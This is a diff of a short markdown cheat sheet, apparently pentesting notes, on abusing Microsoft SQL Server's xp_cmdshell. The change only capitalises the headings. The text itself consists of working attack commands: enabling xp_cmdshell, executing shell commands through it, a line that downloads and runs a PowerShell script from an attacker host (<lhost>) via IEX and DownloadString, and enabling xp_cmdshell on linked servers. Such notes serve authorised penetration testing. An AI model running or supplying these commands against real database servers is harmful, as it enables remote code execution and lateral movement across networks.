@@ -1,19 +1,19 @@
-### enable xp_cmdshell SQL Server configuration
+### Enable xp_cmdshell SQL Server configuration
 ```
 mssql> enable_xp_cmdshell
 ```
 
-### execute shell command
+### Execute shell command
 ```
 mssql> EXEC xp_cmdshell <command>
 ```
 
-### download string and invoke expression
+### Download string and invoke expression
 ```
 mssql> EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://<lhost>/<file>.txt") | powershell -noprofile'
 ```
 
-### enable xp_cmdshell on linked servers
+### Enable xp_cmdshell on linked servers
 ```
 mssql> EXEC('sp_configure ''show advanced options'',1; reconfigure;') AT [<fdqnRhost>]
 mssql> EXEC('sp_configure ''xp_cmdshell'',1; reconfigure;') AT [<fdqnRhost>]
